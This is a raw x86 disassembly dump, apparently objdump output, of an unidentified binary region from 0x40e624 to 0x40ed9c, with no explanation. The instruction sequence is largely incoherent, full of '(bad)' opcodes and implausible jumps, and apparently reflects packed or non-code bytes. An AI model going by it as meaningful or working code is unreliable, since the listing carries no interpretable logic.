  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
